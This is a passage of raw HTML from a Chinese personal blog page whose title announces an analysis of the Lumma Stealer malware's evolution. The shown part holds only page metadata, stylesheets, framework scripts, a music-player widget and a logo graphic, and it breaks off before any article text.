<!DOCTYPE html><html lang="zh"> <head><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/nicky.cool/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CDGfc0hd.js"></script><!-- Global Metadata --><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="generator" content="Astro v5.17.2"><!-- Primary Metadata --><title>Lumma Stealer：从“剪贴板劫持”到“复杂多阶加载”的演进 - Tech &amp; Daily</title><meta name="title" content="Lumma Stealer：从“剪贴板劫持”到“复杂多阶加载”的演进 - Tech &#38; Daily"><meta name="description" content="学习记录|生活分享"><meta name="author" content="NickyWU"><!-- Color --><meta name="theme-color" content=""><meta name="color-scheme" content="light dark"><!-- Open Graph & Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://nickyl07.github.io/nicky.cool/blog/lumma-stealer%E4%BB%8E%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%8A%AB%E6%8C%81%E5%88%B0%E5%A4%8D%E6%9D%82%E5%A4%9A%E9%98%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E6%BC%94%E8%BF%9B/"><meta property="og:title" content="Lumma Stealer：从“剪贴板劫持”到“复杂多阶加载”的演进 - Tech &#38; Daily"><meta property="og:description" content="学习记录|生活分享"><meta property="og:image" content="https://nickyl07.github.io/nicky.cool/og-images/og-image.png"><meta property="og:site_name" content="astro-antfustyle-theme.vercel.app"><meta property="og:locale" content="zh_CN"><meta property="article:author" content="NickyWU"><meta property="article:published_time" content="2026-01-25T00:00:00.000Z"><meta property="article:modified_time" content><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://nickyl07.github.io/nicky.cool/blog/lumma-stealer%E4%BB%8E%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%8A%AB%E6%8C%81%E5%88%B0%E5%A4%8D%E6%9D%82%E5%A4%9A%E9%98%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E6%BC%94%E8%BF%9B/"><meta property="twitter:title" content="Lumma Stealer：从“剪贴板劫持”到“复杂多阶加载”的演进 - Tech &#38; Daily"><meta property="twitter:description" content="学习记录|生活分享"><meta property="twitter:image" content="https://nickyl07.github.io/nicky.cool/og-images/og-image.png"><!-- Canonical URL --><link rel="canonical" href="https://nickyl07.github.io/nicky.cool/blog/lumma-stealer%E4%BB%8E%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%8A%AB%E6%8C%81%E5%88%B0%E5%A4%8D%E6%9D%82%E5%A4%9A%E9%98%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E6%BC%94%E8%BF%9B/"><!-- Icon --><link rel="icon" type="image/svg+xml" href="/nicky.cool/favicon.svg"><link rel="icon" sizes="32x32" href="/nicky.cool/favicon.ico"><link rel="apple-touch-icon" href="/nicky.cool/apple-touch-icon.png"><!-- Manifest --><link rel="manifest" href="/nicky.cool/app.webmanifest"><!-- Sitemap --><link rel="sitemap" href="/nicky.cool/sitemap-index.xml"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="/nicky.cool/rss.xml" href="/rss.xml"><!-- Google JSON-LD Structured Data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Lumma Stealer：从“剪贴板劫持”到“复杂多阶加载”的演进 - Tech & Daily","image":"https://nickyl07.github.io/nicky.cool/og-images/og-image.png","url":"https://nickyl07.github.io/nicky.cool/blog/lumma-stealer%E4%BB%8E%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%8A%AB%E6%8C%81%E5%88%B0%E5%A4%8D%E6%9D%82%E5%A4%9A%E9%98%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E6%BC%94%E8%BF%9B/","datePublished":"2026-01-25T00:00:00.000Z","author":{"@type":"Person","name":"NickyWU","url":"https://astro-antfustyle-theme.vercel.app/"}}</script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/nicky.cool/_astro/_uno.BvtSHey1.css">
<style>*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:var(--un-default-border-color, #e5e7eb)}:before,:after{--un-content: ""}html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,"Apple Color Emoji","Segoe UI Emoji",Segoe UI Symbol,"Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,samp,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit]{-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}ol,ul,menu{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}button,[role=button]{cursor:pointer}:disabled{cursor:default}img,svg,video,canvas,audio,iframe,embed,object{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}
</style>
<link rel="stylesheet" href="/nicky.cool/_astro/main.C20M51KN.css">
<link rel="stylesheet" href="/nicky.cool/_astro/prose.DEF_gphF.css">
<link rel="stylesheet" href="/nicky.cool/_astro/markdown.DtEzIPn6.css">
<style>.github-item-prose h1,.github-item-prose h2,.github-item-prose h3,.github-item-prose h4,.github-item-prose h5{font-size:1em}@media (max-width: 639.9px){.github-item-prose h1,.github-item-prose h2,.github-item-prose h3,.github-item-prose h4,.github-item-prose h5{font-size:.875rem;line-height:1.25rem}}.github-item-prose>:first-child{margin-top:1.6em}.github-item-prose>:last-child{margin-bottom:1.25em}.github-item-prose h5 a{font-size:.875em}@media (max-width: 639.9px){.github-item-prose li{font-size:.875rem;line-height:1.25rem}}summary::-webkit-details-marker{display:none}.card-item-prose p{margin-bottom:1.1em;margin-top:1.1em}.card-masonry>*:first-child{border-radius:.5rem}.card-masonry>*:first-child:hover{--un-shadow:0px 3px 20px -5px var(--un-shadow-color, rgba(0, 0, 0, .2));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.dark .card-masonry>*:first-child:hover{--un-shadow:0px 3px 20px -5px var(--un-shadow-color, rgba(255, 255, 255, .25));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.card-grid>*:first-child{border-radius:.75rem}.card-grid>*:first-child:hover{--un-scale-x:1.03;--un-scale-y:1.03;transform:translate(var(--un-translate-x)) translateY(var(--un-translate-y)) translateZ(var(--un-translate-z)) rotate(var(--un-rotate)) rotateX(var(--un-rotate-x)) rotateY(var(--un-rotate-y)) rotate(var(--un-rotate-z)) skew(var(--un-skew-x)) skewY(var(--un-skew-y)) scaleX(var(--un-scale-x)) scaleY(var(--un-scale-y)) scaleZ(var(--un-scale-z));--un-shadow:0px 0px 15px -3px var(--un-shadow-color, rgba(0, 0, 0, .2));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow);transition-property:transform;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.dark .card-grid>*:first-child:hover{--un-shadow:0px 0px 15px -3px var(--un-shadow-color, rgba(255, 255, 255, .25));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.photo-view[data-layout=masonry] .icon-masonry,.photo-view[data-layout=square] .icon-grid{display:block}.photo-view[data-layout=square] .photo-container{display:grid;grid-template-columns:repeat(auto-fill,minmax(var(--min-photo-width),1fr));gap:var(--photo-gap)}.photo-figure{cursor:pointer;overflow:hidden;background-size:cover;background-image:var(--photo-placeholder)}.photo-view[data-layout=masonry] .photo-figure{position:absolute;top:0;left:0;width:var(--photo-width);height:var(--photo-height);border-radius:.375rem;transform:translate(var(--photo-left),var(--photo-top))}.photo-view[data-layout=square] .photo-figure{position:relative;aspect-ratio:1}.photo-figure img{width:100%;height:100%;object-fit:cover;opacity:var(--photo-opacity, 0);transition:all .3s ease-in-out}.photo-figure:hover img,.photo-figure:focus img{transform:scale(1.05)}.photo-figure figcaption{position:absolute;bottom:0;left:0;width:100%;padding:1rem .6rem .6rem;color:#fff;font-size:.875rem;opacity:0;background:linear-gradient(to top,rgba(0,0,0,.5),transparent);transition:all .3s ease-in-out}.photo-figure:hover figcaption,.photo-figure:focus figcaption{opacity:1}
.astro-route-announcer{position:absolute;left:0;top:0;clip:rect(0 0 0 0);clip-path:inset(50%);overflow:hidden;white-space:nowrap;width:1px;height:1px}
.logo-container[data-astro-cid-cagdmauf]{display:flex;justify-content:center;align-items:center;gap:.8rem;transform:scale(1.05)}@media (max-width: 300px){.logo-container[data-astro-cid-cagdmauf]{margin-top:.125rem;transform-origin:0%;transform:scale(.95)}}.logo-container[data-astro-cid-cagdmauf] svg[data-astro-cid-cagdmauf]{height:2rem}
:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
.i-ph-music-notes-fill[data-v-ef9455f9]{display:block;transform-origin:center}.animate-fade-in[data-v-ef9455f9]{animation:fadeIn-ef9455f9 .3s ease-out forwards}@keyframes fadeIn-ef9455f9{0%{opacity:0;transform:translate(-10px)}to{opacity:1;transform:translate(0)}}input[type=range][data-v-ef9455f9]{-webkit-appearance:none;background:#0000001a;border-radius:2px}input[type=range][data-v-ef9455f9]::-webkit-slider-thumb{-webkit-appearance:none;height:8px;width:8px;border-radius:50%;background:currentColor}
</style></head> <body class="relative flex flex-col min-h-screen
      font-sans text-gray-700 dark:text-gray-200" style="--enter-step:60ms" data-astro-transition-persist="music-player"> <!-- Background -->  <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).only=e;window.dispatchEvent(new Event("astro:only"));})();</script><script>(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="Z17VUjJ" component-url="/nicky.cool/_astro/MusicPlayer.7FHsg482.js" component-export="default" renderer-url="/nicky.cool/_astro/client.BkZ8gEVU.js" props="{&quot;songs&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;LEFT RIGHT&quot;],&quot;url&quot;:[0,&quot;/nicky.cool/media/LEFT RIGHT.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;PUPPET SHOW&quot;],&quot;url&quot;:[0,&quot;/nicky.cool/media/PUPPET SHOW.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;SHOOTING STAR&quot;],&quot;url&quot;:[0,&quot;/nicky.cool/media/SHOOTING STAR.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;WINTER WITHOUT YOU&quot;],&quot;url&quot;:[0,&quot;/nicky.cool/media/WINTER WITHOUT YOU.mp3&quot;]}]]],&quot;data-astro-transition-persist&quot;:[0,&quot;global-music-player&quot;]}" ssr client="only" opts="{&quot;name&quot;:&quot;MusicPlayer&quot;,&quot;value&quot;:&quot;vue&quot;}" data-astro-transition-persist="global-music-player"></astro-island> <!-- Skip Link --> <a class="op-60 no-underline hover:op-100 sr-only focus:not-sr-only focus:fixed focus:start-1 focus:top-1.5 focus:op-20" href="#main">  
Skip to content
</a> <!-- Nav Bar --> <header class="flex items-center gap-6 p-[1.75rem_2rem_2rem] lt-md:px-7"> <a class="op-60 no-underline hover:op-100 select-none op-transition" href="/nicky.cool/" aria-label="NickyWU" aria-current="false" data-astro-cid-cagdmauf="true">   <div class="logo-container" data-astro-cid-cagdmauf> <!-- ICON SVG --> <!-- <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 32 32"
      width="2em"
      height="2em"
      aria-hidden="true"
    >
      <path
        fill="url(#vscodeIconsFileTypeLightAstro0)"
        d="M11.025 20.499c-.532 1.75-.154 4.184 1.105 5.331v-.042l.042-.112c.154-.741.756-1.203 1.526-1.175c.713.014 1.12.392 1.217 1.217c.042.308.042.616.056.938v.098c0 .7.196 1.371.588 1.959c.35.56.84.993 1.497 1.287l-.028-.056l-.028-.112c-.49-1.469-.14-2.49 1.147-3.358l.392-.266l.868-.573a4.25 4.25 0 0 0 1.791-3.037c.07-.532 0-1.05-.154-1.553l-.21.14c-1.945 1.035-4.17 1.4-6.325.98c-1.301-.197-2.56-.56-3.498-1.652z"
      >
      </path>
      <path
        class="dark:fill-[#fdfdfd]"
        fill="#17191e"
        d="M4.925 20.191s3.736-1.82 7.486-1.82l2.84-8.759c.098-.42.406-.7.756-.7s.644.28.756.714l2.826 8.746c4.45 0 7.487 1.82 7.487 1.82L20.709 2.84c-.168-.518-.49-.84-.896-.84h-7.612c-.406 0-.7.322-.896.84z"
      >
      </path>
      <defs>
        <linearGradient
          id="vscodeIconsFileTypeLightAstro0"
          x1="8.19"
          x2="16.91"
          y1="23"
          y2="18.89"
          gradientTransform="translate(-.673 -2.198)scale(1.3993)"
          gradientUnits="userSpaceOnUse"
        >
          <stop offset="0" stop-color="#d83333"></stop>
          <stop offset="1" stop-color="#f041ff"></stop>
        </linearGradient>
      </defs>
    </svg> --> <!-- TEXT SVG --> <!-- Generator: https://danmarshall.github.io/google-font-to-svg-path/ --> <!-- Google font: Great Vibes --> <svg width="107.548" height="40" viewBox="0 0 107.548 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" data-astro-cid-cagdmauf> <g id="svgGroup" class="dark:fill-[#fdfdfd]" fill="#17191e" fill-rule="evenodd" stroke-linecap="round" font-size="9pt" data-astro-cid-cagdmauf> <path vector-effect="non-scaling-stroke" d="M 1.72 26 Q 0.84 26 0.42 25.6 Q 0 25.2 0 24.28 Q 0 23.04 0.74 21.1 Q 1.48 19.16 2.68 16.88 Q 3.88 14.6 5.24 12.36 Q 6.6 10.12 7.84 8.26 Q 9.08 6.4 9.88 5.32 L 9.52 5.2 Q 9.28 5.12 9.28 4.92 Q 9.28 4.72 9.86 4.1 Q 10.44 3.48 11.24 2.74 Q 12.04 2 12.74 1.46 Q 13.44 0.92 13.68 0.92 Q 14.32 0.92 14.86 1.44 Q 15.4 1.96 15.4 2.64 Q 15.4 2.8 15.32 2.96 Q 15.2 3.56 14.82 5.12 Q 14.44 6.68 14.02 8.78 Q 13.6 10.88 13.3 13.16 Q 13 15.44 13 17.44 Q 13 19.76 13.58 21.36 Q 14.16 22.96 15.68 22.96 Q 17.04 22.96 18.42 21.68 Q 19.8 20.4 21.1 18.34 Q 22.4 16.28 23.44 13.96 Q 23.8 13.16 24.32 11.78 Q 24.84 10.4 25.34 8.78 Q 25.84 7.16 26.18 5.62 Q 26.52 4.08 26.52 3 Q 26.52 1.44 25.68 1.44 Q 25.36 1.44 25.02 1.58 Q 24.68 1.72 24.28 1.72 Q 24.16 1.72 23.98 1.66 Q 23.8 1.6 23.8 1.44 Q 23.8 1.04 24.28 0.72 Q 24.76 0.4 25.38 0.2 Q 26 0 26.32 0 Q 27.52 0 28.06 0.82 Q 28.6 1.64 28.6 3.04 Q 28.6 4.68 27.96 6.92 Q 27.32 9.16 26.2 11.6 Q 25.08 14.04 23.64 16.38 Q 22.2 18.72 20.62 20.62 Q 19.04 22.52 17.46 23.64 Q 15.88 24.76 14.48 24.76 Q 13.12 24.76 12.34 23.94 Q 11.56 23.12 11.24 21.74 Q 10.92 20.36 10.92 18.64 Q 10.92 16.68 11.24 14.54 Q 11.56 12.4 12 10.42 Q 12.44 8.44 12.88 6.94 Q 13.32 5.44 13.56 4.76 Q 12.56 5.88 11 7.78 Q 9.44 9.68 7.74 11.96 Q 6.04 14.24 4.52 16.6 Q 3 18.96 2.06 21.06 Q 1.12 23.16 1.12 24.68 Q 1.12 24.88 1.18 25.12 Q 1.24 25.36 1.52 25.36 Q 2.24 25.36 2.24 25.68 Q 2.24 26 1.72 26 Z M 65.76 19.64 L 65.76 19.32 Q 65.28 20.04 64.36 21 Q 63.44 21.96 62.28 22.86 Q 61.12 23.76 60 24.36 Q 58.88 24.96 57.96 24.96 Q 57.32 24.96 57.1 24.56 Q 56.88 24.16 56.88 23.64 Q 56.88 22.24 57.48 20.76 Q 58.08 19.28 58.84 18.02 Q 59.6 16.76 60.2 15.9 Q 60.8 15.04 60.8 14.92 Q 60.8 14.88 60.72 14.88 L 60.38 14.88 Q 60.2 14.88 60.32 14.64 Q 60.88 13.96 61.72 13.44 Q 62.56 12.92 63.32 12.92 Q 63.6 12.92 63.98 13.14 Q 64.36 13.36 64.36 13.68 Q 64.36 13.88 64.12 14.12 Q 63.84 14.4 63.46 14.76 Q 63.08 15.12 62.44 15.88 Q 62.08 16.28 61.44 17.18 Q 60.8 18.08 60.12 19.22 Q 59.44 20.36 58.98 21.46 Q 58.52 22.56 58.52 23.36 Q 58.52 23.48 58.54 23.62 Q 58.56 23.76 58.72 23.88 Q 59.28 23.92 60.12 23.38 Q 60.96 22.84 61.9 21.98 Q 62.84 21.12 63.7 20.14 Q 64.56 19.16 65.22 18.3 Q 65.88 17.44 66.16 16.92 Q 66.6 16.12 67.48 16.12 Q 68.12 16.12 68.22 16.4 Q 68.32 16.68 68.32 17.16 Q 68.32 18.72 68.14 19.9 Q 67.96 21.08 67.48 22.56 Q 70.04 20.36 72.36 17.92 Q 72.4 17.84 72.54 17.72 Q 72.68 17.6 72.76 17.6 Q 73 17.6 73 17.84 Q 73 18.16 72.76 18.48 Q 72.4 18.92 71.98 19.36 Q 71.56 19.8 71.16 20.24 Q 70.2 21.28 69.2 22.3 Q 68.2 23.32 67.08 24.24 Q 65.24 29.08 62.26 32.74 Q 59.28 36.4 54.76 39 Q 54 39.44 53.04 39.84 Q 52.08 40.24 51.16 40.24 Q 49.32 40.24 49.32 38.4 Q 49.32 38.2 49.34 38 Q 49.36 37.8 49.4 37.6 Q 49.72 36.16 50.76 34.84 Q 51.8 33.52 53.2 32.38 Q 54.6 31.24 56.06 30.26 Q 57.52 29.28 58.68 28.56 Q 59.36 28.12 60.42 27.48 Q 61.48 26.84 62.68 26.1 Q 63.88 25.36 64.96 24.72 Q 65.4 23.6 65.58 22.22 Q 65.76 20.84 65.76 19.64 Z M 52.08 39.24 Q 53.16 39.24 54.42 38.46 Q 55.68 37.68 56.92 36.52 Q 58.16 35.36 59.18 34.22 Q 60.2 33.08 60.8 32.32 Q 61.48 31.4 62.12 30.5 Q 62.76 29.6 63.32 28.64 Q 64.16 27.24 64.72 25.92 Q 64.76 25.8 64.66 25.78 L 64.56 25.76 Q 63.32 26.64 62.06 27.5 Q 60.8 28.36 59.52 29.2 Q 58.88 29.6 57.8 30.38 Q 56.72 31.16 55.48 32.14 Q 54.24 33.12 53.12 34.18 Q 52 35.24 51.28 36.26 Q 50.56 37.28 50.56 38.08 Q 50.56 38.72 51.06 38.98 Q 51.56 39.24 52.08 39.24 Z M 42.4 22.56 L 45.28 17.44 Q 44.92 17.72 44.6 18.04 Q 44.28 18.36 43.88 18.72 Q 43.72 18.88 43.52 18.88 Q 43.36 18.88 43.36 18.72 Q 43.36 18.56 43.56 18.28 Q 44.48 17.12 45.82 15.7 Q 47.16 14.28 48.76 11.84 Q 49.28 11.04 50.24 9.84 Q 51.2 8.64 52.34 7.28 Q 53.48 5.92 54.64 4.7 Q 55.8 3.48 56.68 2.64 Q 57.12 2.28 57.44 2.04 Q 57.76 1.8 57.92 1.76 Q 58.28 1.76 58.6 2.16 Q 58.92 2.56 58.96 3 Q 58.96 3.44 58.64 3.6 Q 58.16 4 57.74 4.32 Q 57.32 4.64 56.88 5.04 Q 55.8 6 54.48 7.4 Q 53.16 8.8 51.82 10.4 Q 50.48 12 49.26 13.62 Q 48.04 15.24 47.12 16.68 Q 47.2 16.76 47.28 16.76 Q 47.4 16.76 47.58 16.62 Q 47.76 16.48 48.04 16.24 Q 49.44 15.04 51.08 13.78 Q 52.72 12.52 54.24 11.48 Q 54.68 11.2 55.14 10.98 Q 55.6 10.76 56.12 10.76 Q 56.44 10.76 56.74 10.86 Q 57.04 10.96 57.2 11.2 Q 57.6 11.32 57.98 11.6 Q 58.36 11.88 58.36 12.36 Q 58.36 12.96 57.76 13.5 Q 57.16 14.04 56.72 14.36 Q 55.36 15.24 53.54 15.86 Q 51.72 16.48 50 16.8 Q 49.72 18.04 49.5 19.34 Q 49.28 20.64 49.28 21.72 Q 49.28 22.84 49.56 23.56 Q 49.84 24.28 50.6 24.28 Q 51.04 24.28 51.7 23.86 Q 52.36 23.44 53.06 22.86 Q 53.76 22.28 54.34 21.72 Q 54.92 21.16 55.24 20.88 Q 55.6 20.56 56.28 19.92 Q 56.96 19.28 57.62 18.64 Q 58.28 18 58.52 17.72 Q 58.56 17.68 58.64 17.68 Q 58.84 17.68 58.84 17.96 Q 58.84 18.28 58.36 18.8 L 57.68 19.56 Q 56.04 21.4 54.46 23.06 Q 52.88 24.72 51.68 25.36 Q 51.28 25.56 50.88 25.56 Q 49.04 25.56 48.32 24.36 Q 47.6 23.16 47.6 21.44 Q 47.6 20.48 47.76 19.46 Q 47.92 18.44 48.16 17.44 Q 47.68 17.72 47 18.32 Q 46.32 18.92 45.44 19.84 Q 44.76 21.2 44.24 22.46 Q 43.72 23.72 43.08 24.76 Q 42.96 24.92 42.76 24.96 Q 42.56 25 42.36 25 Q 41.52 25 41.52 24.24 Q 41.52 23.36 42.4 22.56 Z M 50.28 15.76 Q 50.72 15.68 51.64 15.4 Q 52.56 15.12 53.54 14.68 Q 54.52 14.24 55.26 13.74 Q 56 13.24 56.12 12.72 Q 56 12.44 55.68 12.44 Q 55.4 12.44 54.64 12.86 Q 53.88 13.28 53 13.86 Q 52.12 14.44 51.36 14.98 Q 50.6 15.52 50.28 15.76 Z M 34.72 25.48 Q 33.4 25.48 32.62 24.6 Q 31.84 23.72 31.84 22.36 Q 31.84 21.08 32.66 19.56 Q 33.48 18.04 34.78 16.6 Q 36.08 15.16 37.48 14.08 Q 38.88 13 40 12.6 Q 40.52 12.4 40.96 12.4 Q 41.48 12.4 41.64 12.64 Q 41.8 12.88 41.9 13.16 Q 42 13.44 42.24 13.6 Q 42.68 13.84 42.68 14.44 Q 42.68 14.88 42.46 15.5 Q 42.24 16.12 41.84 16.58 Q 41.44 17.04 40.88 17.04 Q 40.36 17.04 40.36 16.6 Q 40.36 16.32 40.64 16 Q 40.92 15.68 41.2 15.3 Q 41.48 14.92 41.48 14.56 Q 41.48 14.2 41.12 14.2 Q 40.44 14.2 39.44 14.9 Q 38.44 15.6 37.4 16.72 Q 36.36 17.84 35.44 19.1 Q 34.52 20.36 33.96 21.48 Q 33.4 22.6 33.4 23.32 Q 33.4 23.84 33.66 24.18 Q 33.92 24.52 34.44 24.52 Q 35.28 24.52 36.32 24.04 Q 37.36 23.56 38.3 22.88 Q 39.24 22.2 39.84 21.68 Q 40.96 20.68 42.02 19.66 Q 43.08 18.64 44.12 17.6 Q 44.24 17.48 44.4 17.48 Q 44.76 17.48 44.76 17.8 Q 44.76 17.96 44.12 18.66 Q 43.48 19.36 42.6 20.24 Q 41.72 21.12 40.96 21.84 Q 40.2 22.56 39.96 22.76 Q 39.32 23.32 38.42 23.96 Q 37.52 24.6 36.56 25.04 Q 35.6 25.48 34.72 25.48 Z M 26.8 25.76 Q 26.16 25.76 25.62 25.24 Q 25.08 24.72 24.96 24.12 Q 25.08 23.36 25.5 22.26 Q 25.92 21.16 26.48 19.96 Q 27.04 18.76 27.6 17.7 Q 28.16 16.64 28.56 16 Q 27.8 16.68 26.94 17.52 Q 26.08 18.36 25.32 19.08 Q 25.28 19.12 25.14 19.24 Q 25 19.36 24.88 19.36 Q 24.6 19.36 24.6 19.12 Q 24.6 18.92 24.76 18.76 Q 25.84 17.56 27.02 16.36 Q 28.2 15.16 29.32 13.88 Q 29.68 13.44 29.94 13.18 Q 30.2 12.92 30.76 12.92 Q 31 12.92 31.5 13.02 Q 32 13.12 32.34 13.36 Q 32.68 13.6 32.44 13.96 Q 32.16 14.4 31.48 15.4 Q 30.8 16.4 29.94 17.68 Q 29.08 18.96 28.26 20.26 Q 27.44 21.56 26.92 22.6 Q 26.4 23.64 26.4 24.16 Q 26.4 24.4 26.56 24.4 Q 26.8 24.4 27.38 23.96 Q 27.96 23.52 28.54 23.02 Q 29.12 22.52 29.32 22.36 Q 30.48 21.36 31.6 20.3 Q 32.72 19.24 33.72 18.08 Q 33.8 18 33.94 17.84 Q 34.08 17.68 34.24 17.68 Q 34.44 17.68 34.44 17.92 Q 34.44 18.2 34.24 18.48 Q 33.72 19.12 33.08 19.74 Q 32.44 20.36 31.88 20.96 Q 30.84 22 29.86 23.02 Q 28.88 24.04 27.92 25.12 Q 27.72 